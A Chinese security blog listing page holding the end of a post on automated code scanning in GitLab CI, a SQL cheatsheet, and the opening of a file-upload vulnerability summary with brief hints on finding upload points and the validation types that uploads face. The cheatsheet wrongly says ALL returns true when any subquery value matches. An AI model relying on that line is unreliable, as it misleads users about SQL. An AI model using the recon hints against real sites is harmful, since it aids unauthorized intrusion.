<p><img src="\assets\img\auto_scan\23.png" alt=""></p>
<h4 id="6-3-代码统计"><a href="#6-3-代码统计" class="headerlink" title="6.3 代码统计"></a>6.3 代码统计</h4><p>使用cloc工具进行文件与代码行数的统计, 这里你可能需要通过–exclude-ext、–exclude-dir参数来过滤一些无意义的文件，比如：字体、图片、声音、视频等。举个例子，过滤所有图片后统计：cloc ./目标路径 –exclude-ext=.jpg,.jpeg,.png,.bmp,.gif,.ico。</p>
<h4 id="6-4-项目组件分析"><a href="#6-4-项目组件分析" class="headerlink" title="6.4 项目组件分析"></a>6.4 项目组件分析</h4><p>组件分析主要是针对如使用 Java 语言开发项目时使用 Maven 管理的 pom.xml 配置文件; Python 中的 requirements.txt 文件；JS 项目中的package.json文件做解析。这里我写了一个clocwalk 工具可以分析项目的依赖组件，这个项目目前已经开源，你可以通过<a href="https://github.com/MyKings/clocwalk地址来获取这个工具。" target="_blank" rel="noopener">https://github.com/MyKings/clocwalk地址来获取这个工具。</a></p>
<h4 id="6-5-漏报处理"><a href="#6-5-漏报处理" class="headerlink" title="6.5 漏报处理"></a>6.5 漏报处理</h4><p>关于漏报问题，你可以根据自己企业 SRC 中的漏洞，总结出一套适合自己企业的黑名单规则；或者你可以添加一些 CWE 的漏洞规则，关于 CWE 的信息你可以访问这个地址 <a href="https://cwe.mitre.org/data/index.html。" target="_blank" rel="noopener">https://cwe.mitre.org/data/index.html。</a></p>
<h4 id="6-6-误报处理"><a href="#6-6-误报处理" class="headerlink" title="6.6 误报处理"></a>6.6 误报处理</h4><p>关于误报问题可能会较多，比如扫描出单元测试或功能测试的硬编码问题；比如变量参数String PARAM_NAME_PASSWORD=”passwd_txt”;问题。 以上的问题我们可以通过白名单插件处理，比如插件中对文件路径和方法判断是否存在 test 关键字，如果存在我们就认为这个是误报。另外针对某些特殊类型的误报，比如在 A 项目下才是误报，其他项目就是漏洞的情况，我们可以设置这个项目的白名单漏洞 Case，其匹配规则条件为：项目名称、漏洞文件、漏洞类型、漏洞所在行，当所有条件都同时满足时，那么这个漏洞就会可以判断为误报。</p>
<h4 id="6-7-漏洞闭环"><a href="#6-7-漏洞闭环" class="headerlink" title="6.7 漏洞闭环"></a>6.7 漏洞闭环</h4><p>当一个高/中危漏洞被发现并确认时，我们应该如何跟踪这个漏洞的生命周期？往往安全人员会将一个漏洞提交到内部的 SOC 系统中，由于 SOC 系统没有和项目开发的流程控制系统（如：Jira）没有直接联系，开发人员可能会忽视或忘记修复这个高危漏洞，如何避免这种情况？我们这里以 GitLab 举例，当扫描系统扫描出高危漏洞时，系统会通过 GitLab 的 POST /projects/:id/issues API接口来自动创建一条 issue 并指派给当前项目的 master，项目负责人同时会收到一条邮件提醒，那么项目负责人可根据漏洞严重程度来安排项目的迭代计划，这样我们就把审计系统扫描出的漏洞与项目开发流程很好的结合起来了。</p>
<h3 id="7-GitLab-CI-触发"><a href="#7-GitLab-CI-触发" class="headerlink" title="7 GitLab CI 触发"></a>7 GitLab CI 触发</h3><p>当然也可以使用 Jenkins 来做 CI/CD 系统。我们这里开发了一个.code-audit.py触发脚本, Jenkins 你也可以使用 Python 脚本或是开发 Jenkins 插件来达到触发目的。</p>
<h4 id="7-1-配置项目"><a href="#7-1-配置项目" class="headerlink" title="7.1 配置项目"></a>7.1 配置项目</h4><p>这里需要了解 .gitlab-ci.yml 文件格式的编写，下面是一个 Python 项目的配置。可以看出整个 CI 过程分为 4 个阶段：build、test、codeaudit、deploy。 其中codeaudit是我们的代码扫描阶段，这里我们限制了只有 develop 的动作才会触发扫描。</p>
<p><img src="\assets\img\auto_scan\24.png" alt=""></p>
<h4 id="7-2-扫描脚本"><a href="#7-2-扫描脚本" class="headerlink" title="7.2 扫描脚本"></a>7.2 扫描脚本</h4><p>触发扫描脚本如下图，其大体的执行流程如下：</p>
<ul>
<li>获取 GitLab CI 中关于项目的环境变量信息；</li>
<li>设定要拦截的漏洞级别，默认：中、高危漏洞不通过测试；</li>
<li>同步项目信息到扫描系统，如果失败扫描代码不通过；</li>
<li>创建扫描任务，如果失败扫描代码不通过；</li>
<li>异步查询扫描结果，超时时间10分钟，如果超时扫描代码不通过；</li>
<li>扫描结果完成，统计是否存在预定义级别的漏洞，如果存在扫描代码不通过。</li>
</ul>
<p><img src="\assets\img\auto_scan\25.png" alt=""></p>
<p>下图为整个 CI 过程的截图。</p>
<p><img src="\assets\img\auto_scan\26.png" alt=""></p>
<p>下图为代码扫描失败的反馈结果，图中可以看出发现了一个漏洞。</p>
<p><img src="\assets\img\auto_scan\27.png" alt=""></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>代码扫描固然重要，但是它不会解决所有项目的安全问题。项目安全应该从多个维度、多角度的来进行。如：项目立项时开始SDL；开发迭代过程中的代码扫描；项目上线前的黑盒测试。</p>
<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg" target="_blank" rel="noopener">代码自动化扫描系统的建设（上）</a></li>
<li><a href="https://mp.weixin.qq.com/s/4XtIWbkIeCjbNWT2VCFHZg" target="_blank" rel="noopener">代码自动化扫描系统的建设（下）</a></li>
<li><a href="https://baike.baidu.com/item/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90" target="_blank" rel="noopener">CI (持续集成)</a></li>
<li><a href="https://baike.baidu.com/item/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98" target="_blank" rel="noopener">CD (持续交付)</a></li>
<li><a href="https://www.owasp.org/index.php/Top_10-2017_Top_10" target="_blank" rel="noopener">OWASP 2017 TOP 10</a></li>
<li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a></li>
<li><a href="https://git-scm.com/docs" target="_blank" rel="noopener">https://git-scm.com/docs</a></li>
<li><a href="https://docs.gitlab.com/ee/api/" target="_blank" rel="noopener">https://docs.gitlab.com/ee/api/</a></li>
<li><a href="https://about.gitlab.com/features/gitlab-ci-cd/" target="_blank" rel="noopener">https://about.gitlab.com/features/gitlab-ci-cd/</a></li>
<li><a href="https://docs.gitlab.com/ce/ci/yaml/README.html" target="_blank" rel="noopener">https://docs.gitlab.com/ce/ci/yaml/README.html</a></li>
<li><a href="https://docs.gitlab.com/ce/ci/examples/README.html" target="_blank" rel="noopener">https://docs.gitlab.com/ce/ci/examples/README.html</a></li>
<li><a href="https://docs.gitlab.com/ee/api/issues.html" target="_blank" rel="noopener">https://docs.gitlab.com/ee/api/issues.html</a></li>
<li><a href="https://docs.gitlab.com/runner/install/docker.html" target="_blank" rel="noopener">https://docs.gitlab.com/runner/install/docker.html</a></li>
<li><a href="https://docs.sonarqube.org/display/DEV/Web+API" target="_blank" rel="noopener">https://docs.sonarqube.org/display/DEV/Web+API</a></li>
<li><a href="https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization" target="_blank" rel="noopener">https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization</a></li>
<li><a href="https://www.sonarqube.org/downloads/" target="_blank" rel="noopener">https://www.sonarqube.org/downloads/</a></li>
<li><a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner</a></li>
<li><a href="https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf" target="_blank" rel="noopener">https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf</a></li>
<li><a href="https://github.com/MyKings/clocwalk" target="_blank" rel="noopener">https://github.com/MyKings/clocwalk</a></li>
</ul>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="https://www.pa55w0rd.club/pa55w0rd-new.github.io/代码自动化扫描系统建设/" data-id="cjoo67gka002jdxt667bpw6gu" class="article-share-link" data-share="baidu" data-title="代码自动化扫描系统的建设（转发）">分享到</a>
      

      
        <a href="https://www.pa55w0rd.club/pa55w0rd-new.github.io/代码自动化扫描系统建设/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>









  
    <article id="post-quick-SQL-cheatsheet" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/pa55w0rd-new.github.io/quick-SQL-cheatsheet/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-19T09:24:03.000Z" itemprop="datePublished">2018-10-19</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/pa55w0rd-new.github.io/categories/note/">note</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/pa55w0rd-new.github.io/quick-SQL-cheatsheet/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>SQL 速查表</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <ul>
<li>目录<br>{:toc}</li>
</ul>
<!--
# 内容 
1. [ 查找数据的查询 ](#find)
2. [ 修改数据的查询 ](#modify)
3. [ 聚合查询 ](#report)
4. [ 连接查询 ](#joins)
5. [ 视图查询 ](#view)
6. [ 修改表的查询 ](#alter) 
https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
-->
<p><a name="find"></a></p>
<h1 id="1-查找数据的查询"><a href="#1-查找数据的查询" class="headerlink" title="1. 查找数据的查询"></a>1. 查找数据的查询</h1><h3 id="SELECT-用于从数据库中选择数据"><a href="#SELECT-用于从数据库中选择数据" class="headerlink" title="SELECT: 用于从数据库中选择数据"></a><strong>SELECT</strong>: 用于从数据库中选择数据</h3><ul>
<li><code>SELECT</code> * <code>FROM</code> table_name;</li>
</ul>
<h3 id="DISTINCT-用于过滤掉重复的值并返回指定列的行"><a href="#DISTINCT-用于过滤掉重复的值并返回指定列的行" class="headerlink" title="DISTINCT: 用于过滤掉重复的值并返回指定列的行"></a><strong>DISTINCT</strong>: 用于过滤掉重复的值并返回指定列的行</h3><ul>
<li><code>SELECT DISTINCT</code> column_name;</li>
</ul>
<h3 id="WHERE-用于过滤记录-行"><a href="#WHERE-用于过滤记录-行" class="headerlink" title="WHERE: 用于过滤记录/行"></a><strong>WHERE</strong>: 用于过滤记录/行</h3><ul>
<li><code>SELECT</code> column1, column2 <code>FROM</code> table_name <code>WHERE</code> condition;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>AND</code> condition2;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>OR</code> condition2;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE NOT</code> condition;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>AND</code> (condition2 <code>OR</code> condition3);</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE EXISTS</code> (<code>SELECT</code> column_name <code>FROM</code> table_name <code>WHERE</code> condition);</li>
</ul>
<h3 id="ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）"><a href="#ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）" class="headerlink" title="ORDER BY: 用于结果集的排序，升序（ASC）或者降序（DESC）"></a><strong>ORDER BY</strong>: 用于结果集的排序，升序（ASC）或者降序（DESC）</h3><ul>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column <code>DESC</code>;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column1 <code>ASC</code>, column2 <code>DESC</code>;</li>
</ul>
<h3 id="SELECT-TOP-用于指定从表顶部返回的记录数"><a href="#SELECT-TOP-用于指定从表顶部返回的记录数" class="headerlink" title="SELECT TOP: 用于指定从表顶部返回的记录数"></a><strong>SELECT TOP</strong>: 用于指定从表顶部返回的记录数</h3><ul>
<li><code>SELECT TOP</code> number columns_names <code>FROM</code> table_name <code>WHERE</code> condition;</li>
<li><code>SELECT TOP</code> percent columns_names <code>FROM</code> table_name <code>WHERE</code> condition;</li>
<li>并非所有数据库系统都支持<code>SELECT TOP</code>。 MySQL 中是<code>LIMIT</code>子句</li>
<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>LIMIT</code> offset, count;</li>
</ul>
<h3 id="LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符"><a href="#LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符" class="headerlink" title="LIKE: 用于搜索列中的特定模式，WHERE 子句中使用的运算符"></a><strong>LIKE</strong>: 用于搜索列中的特定模式，WHERE 子句中使用的运算符</h3><ul>
<li>% (percent sign) 是一个表示零个，一个或多个字符的通配符</li>
<li>_ (underscore) 是一个表示单个字符通配符</li>
<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>LIKE</code> pattern;</li>
<li><code>LIKE</code> ‘a%’    （查找任何以“a”开头的值）</li>
<li><code>LIKE</code> ‘%a’    （查找任何以“a”结尾的值）</li>
<li><code>LIKE</code> ‘%or%’  （查找任何包含“or”的值）</li>
<li><code>LIKE</code> ‘_r%’   （查找任何第二位是“r”的值）</li>
<li><code>LIKE</code> ‘a_%_%’ （查找任何以“a”开头且长度至少为3的值）</li>
<li><code>LIKE</code> ‘[a-c]%’（查找任何以“a”或“b”或“c”开头的值）</li>
</ul>
<h3 id="IN-用于在-WHERE-子句中指定多个值的运算符"><a href="#IN-用于在-WHERE-子句中指定多个值的运算符" class="headerlink" title="IN: 用于在 WHERE 子句中指定多个值的运算符"></a><strong>IN</strong>: 用于在 WHERE 子句中指定多个值的运算符</h3><ul>
<li>本质上，IN运算符是多个OR条件的简写</li>
<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>IN</code> (value1, value2, …);</li>
<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>IN</code> (<code>SELECT STATEMENT</code>);</li>
</ul>
<h3 id="BETWEEN-用于过滤给定范围的值的运算符"><a href="#BETWEEN-用于过滤给定范围的值的运算符" class="headerlink" title="BETWEEN: 用于过滤给定范围的值的运算符"></a><strong>BETWEEN</strong>: 用于过滤给定范围的值的运算符</h3><ul>
<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>BETWEEN</code> value1 <code>AND</code> value2;</li>
<li><code>SELECT</code> * <code>FROM</code> Products <code>WHERE</code> (column_name <code>BETWEEN</code> value1 <code>AND</code> value2) <code>AND NOT</code> column_name2 <code>IN</code> (value3, value4);</li>
<li><code>SELECT</code> * <code>FROM</code> Products <code>WHERE</code> column_name <code>BETWEEN</code> #01/07/1999# AND #03/12/1999#;</li>
</ul>
<h3 id="NULL-代表一个字段没有值"><a href="#NULL-代表一个字段没有值" class="headerlink" title="NULL: 代表一个字段没有值"></a><strong>NULL</strong>: 代表一个字段没有值</h3><ul>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> column_name <code>IS NULL</code>;</li>
<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> column_name <code>IS NOT NULL</code>;</li>
</ul>
<h3 id="AS-用于给表或者列分配别名"><a href="#AS-用于给表或者列分配别名" class="headerlink" title="AS: 用于给表或者列分配别名"></a><strong>AS</strong>: 用于给表或者列分配别名</h3><ul>
<li><code>SELECT</code> column_name <code>AS</code> alias_name <code>FROM</code> table_name;</li>
<li><code>SELECT</code> column_name <code>FROM</code> table_name <code>AS</code> alias_name;</li>
<li><code>SELECT</code> column_name <code>AS</code> alias_name1, column_name2 <code>AS</code> alias_name2;</li>
<li><code>SELECT</code> column_name1, column_name2 + ‘, ‘ + column_name3 <code>AS</code> alias_name;</li>
</ul>
<h3 id="UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符"><a href="#UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符" class="headerlink" title="UNION: 用于组合两个或者多个 SELECT 语句的结果集的运算符"></a><strong>UNION</strong>: 用于组合两个或者多个 SELECT 语句的结果集的运算符</h3><ul>
<li>每个 SELECT 语句必须拥有相同的列数</li>
<li>列必须拥有相似的数据类型</li>
<li>每个 SELECT 语句中的列也必须具有相同的顺序</li>
<li><code>SELECT</code> columns_names <code>FROM</code> table1 <code>UNION SELECT</code> column_name <code>FROM</code> table2;</li>
<li><code>UNION</code> 仅允许选择不同的值, <code>UNION ALL</code> 允许重复</li>
</ul>
<h3 id="ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符"><a href="#ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符" class="headerlink" title="ANY|ALL: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符"></a><strong>ANY|ALL</strong>: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符</h3><ul>
<li><code>ANY</code> 如果任何子查询值满足条件，则返回 true。</li>
<li><code>ALL</code> 如果任何子查询值满足条件，则返回 true。</li>
<li><code>SELECT</code> columns_names <code>FROM</code> table1 <code>WHERE</code> column_name operator (<code>ANY</code>|<code>ALL</code>) (<code>SELECT</code> column_name <code>FROM</code> table_name <code>WHERE</code> condition);</li>
</ul>
<h3 id="GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"><a href="#GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列" class="headerlink" title="GROUP BY: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"></a><strong>GROUP BY</strong>: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列</h3><ul>
<li><code>SELECT</code> column_name1, COUNT(column_name2) <code>FROM</code> table_name <code>WHERE</code> condition <code>GROUP BY</code> column_name1 <code>ORDER BY</code> COUNT(column_name2) DESC;</li>
</ul>
<h3 id="HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。"><a href="#HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。" class="headerlink" title="HAVING: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。"></a><strong>HAVING</strong>: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。</h3><ul>
<li><code>SELECT</code> <code>COUNT</code>(column_name1), column_name2 <code>FROM</code> table <code>GROUP BY</code> column_name2 <code>HAVING</code> <code>COUNT(</code>column_name1<code>)</code> &gt; 5;</li>
</ul>
<p><a name="modify"></a></p>
<h1 id="2-修改数据的查询"><a href="#2-修改数据的查询" class="headerlink" title="2. 修改数据的查询"></a>2. 修改数据的查询</h1><h3 id="INSERT-INTO-用于在表中插入新记录-行"><a href="#INSERT-INTO-用于在表中插入新记录-行" class="headerlink" title="INSERT INTO: 用于在表中插入新记录/行"></a><strong>INSERT INTO</strong>: 用于在表中插入新记录/行</h3><ul>
<li><code>INSERT INTO</code> table_name (column1, column2) <code>VALUES</code> (value1, value2);</li>
<li><code>INSERT INTO</code> table_name <code>VALUES</code> (value1, value2 …);</li>
</ul>
<h3 id="UPDATE-用于修改表中的现有记录-行"><a href="#UPDATE-用于修改表中的现有记录-行" class="headerlink" title="UPDATE: 用于修改表中的现有记录/行"></a><strong>UPDATE</strong>: 用于修改表中的现有记录/行</h3><ul>
<li><code>UPDATE</code> table_name <code>SET</code> column1 = value1, column2 = value2 <code>WHERE</code> condition;</li>
<li><code>UPDATE</code> table_name <code>SET</code> column_name = value;</li>
</ul>
<h3 id="DELETE-用于删除表中的现有记录-行"><a href="#DELETE-用于删除表中的现有记录-行" class="headerlink" title="DELETE: 用于删除表中的现有记录/行"></a><strong>DELETE</strong>: 用于删除表中的现有记录/行</h3><ul>
<li><code>DELETE FROM</code> table_name <code>WHERE</code> condition;</li>
<li><code>DELETE</code> * <code>FROM</code> table_name;</li>
</ul>
<p><a name="report"></a></p>
<h1 id="3-聚合查询"><a href="#3-聚合查询" class="headerlink" title="3. 聚合查询"></a>3. 聚合查询</h1><h3 id="COUNT-返回出现次数"><a href="#COUNT-返回出现次数" class="headerlink" title="COUNT: 返回出现次数"></a><strong>COUNT</strong>: 返回出现次数</h3><ul>
<li><code>SELECT COUNT (DISTINCT</code> column_name<code>)</code>;</li>
</ul>
<h3 id="MIN-and-MAX-返回所选列的最小-最大值"><a href="#MIN-and-MAX-返回所选列的最小-最大值" class="headerlink" title="MIN() and MAX(): 返回所选列的最小/最大值"></a><strong>MIN() and MAX()</strong>: 返回所选列的最小/最大值</h3><ul>
<li><code>SELECT MIN (</code>column_names<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
<li><code>SELECT MAX (</code>column_names<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
</ul>
<h3 id="AVG-返回数字列的平均值"><a href="#AVG-返回数字列的平均值" class="headerlink" title="AVG(): 返回数字列的平均值"></a><strong>AVG()</strong>: 返回数字列的平均值</h3><ul>
<li><code>SELECT AVG (</code>column_name<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
</ul>
<h3 id="SUM-返回数值列的总和"><a href="#SUM-返回数值列的总和" class="headerlink" title="SUM(): 返回数值列的总和"></a><strong>SUM()</strong>: 返回数值列的总和</h3><ul>
<li><code>SELECT SUM (</code>column_name<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
</ul>
<p><a name="joins"></a></p>
<h1 id="4-连接查询"><a href="#4-连接查询" class="headerlink" title="4. 连接查询"></a>4. 连接查询</h1><h3 id="INNER-JOIN-内连接，返回在两张表中具有匹配值的记录"><a href="#INNER-JOIN-内连接，返回在两张表中具有匹配值的记录" class="headerlink" title="INNER JOIN: 内连接，返回在两张表中具有匹配值的记录"></a><strong>INNER JOIN</strong>: 内连接，返回在两张表中具有匹配值的记录</h3><ul>
<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>INNER JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
<li><code>SELECT</code> table1.column_name1, table2.column_name2, table3.column_name3 <code>FROM</code> ((table1 <code>INNER JOIN</code> table2 <code>ON</code> relationship) <code>INNER JOIN</code> table3 <code>ON</code> relationship);</li>
</ul>
<h3 id="LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"><a href="#LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）" class="headerlink" title="LEFT (OUTER) JOIN: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"></a><strong>LEFT (OUTER) JOIN</strong>: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）</h3><ul>
<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>LEFT JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
</ul>
<h3 id="RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"><a href="#RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录" class="headerlink" title="RIGHT (OUTER) JOIN: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"></a><strong>RIGHT (OUTER) JOIN</strong>: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录</h3><ul>
<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>RIGHT JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
</ul>
<h3 id="FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。"><a href="#FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。" class="headerlink" title="FULL (OUTER) JOIN: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。"></a><strong>FULL (OUTER) JOIN</strong>: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。</h3><ul>
<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>FULL OUTER JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
</ul>
<h3 id="Self-JOIN-自连接，表自身连接"><a href="#Self-JOIN-自连接，表自身连接" class="headerlink" title="Self JOIN: 自连接，表自身连接"></a><strong>Self JOIN</strong>: 自连接，表自身连接</h3><ul>
<li><code>SELECT</code> column_names <code>FROM</code> table1 T1, table1 T2 <code>WHERE</code> condition;</li>
</ul>
<p><a name="view"></a></p>
<h1 id="5-视图查询"><a href="#5-视图查询" class="headerlink" title="5. 视图查询"></a>5. 视图查询</h1><h3 id="CREATE-创建视图"><a href="#CREATE-创建视图" class="headerlink" title="CREATE: 创建视图"></a><strong>CREATE</strong>: 创建视图</h3><ul>
<li><code>CREATE VIEW</code> view_name <code>AS SELECT</code> column1, column2 <code>FROM</code> table_name <code>WHERE</code> condition;</li>
</ul>
<h3 id="SELECT-检索视图"><a href="#SELECT-检索视图" class="headerlink" title="SELECT: 检索视图"></a><strong>SELECT</strong>: 检索视图</h3><ul>
<li><code>SELECT</code> * <code>FROM</code> view_name;</li>
</ul>
<h3 id="DROP-删除视图"><a href="#DROP-删除视图" class="headerlink" title="DROP: 删除视图"></a><strong>DROP</strong>: 删除视图</h3><ul>
<li><code>DROP VIEW</code> view_name;</li>
</ul>
<p><a name="alter"></a></p>
<h1 id="6-修改表的查询"><a href="#6-修改表的查询" class="headerlink" title="6. 修改表的查询"></a>6. 修改表的查询</h1><h3 id="ADD-添加字段"><a href="#ADD-添加字段" class="headerlink" title="ADD: 添加字段"></a><strong>ADD</strong>: 添加字段</h3><ul>
<li><code>ALTER TABLE</code> table_name <code>ADD</code> column_name column_definition;</li>
</ul>
<h3 id="MODIFY-修改字段数据类型"><a href="#MODIFY-修改字段数据类型" class="headerlink" title="MODIFY: 修改字段数据类型"></a><strong>MODIFY</strong>: 修改字段数据类型</h3><ul>
<li><code>ALTER TABLE</code> table_name <code>MODIFY</code> column_name column_type;</li>
</ul>
<h3 id="DROP-删除字段"><a href="#DROP-删除字段" class="headerlink" title="DROP: 删除字段"></a><strong>DROP</strong>: 删除字段</h3><ul>
<li><code>ALTER TABLE</code> table_name <code>DROP COLUMN</code> column_name;</li>
</ul>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="https://www.pa55w0rd.club/pa55w0rd-new.github.io/quick-SQL-cheatsheet/" data-id="cjoo67gfp001pdxt6ufnwj7l9" class="article-share-link" data-share="baidu" data-title="SQL 速查表">分享到</a>
      

      
        <a href="https://www.pa55w0rd.club/pa55w0rd-new.github.io/quick-SQL-cheatsheet/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>









  
    <article id="post-fileupload" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/pa55w0rd-new.github.io/fileupload/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-19T09:24:03.000Z" itemprop="datePublished">2018-10-19</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/pa55w0rd-new.github.io/categories/web安全/">web安全</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/pa55w0rd-new.github.io/fileupload/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>文件上传漏洞总结</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。 </p>
<p>上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。 </p>
<p><strong>漏洞挖掘和利用</strong></p>
<p>查找上传点，图片，头像，附件；目录，文件扫描发现类似upload,php等文件，编译器目录如ewebeditor,fckeditor,kingeditor等 </p>
<h2 id="0x01-文件上传校验姿势"><a href="#0x01-文件上传校验姿势" class="headerlink" title="0x01 文件上传校验姿势"></a>0x01 文件上传校验姿势</h2><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
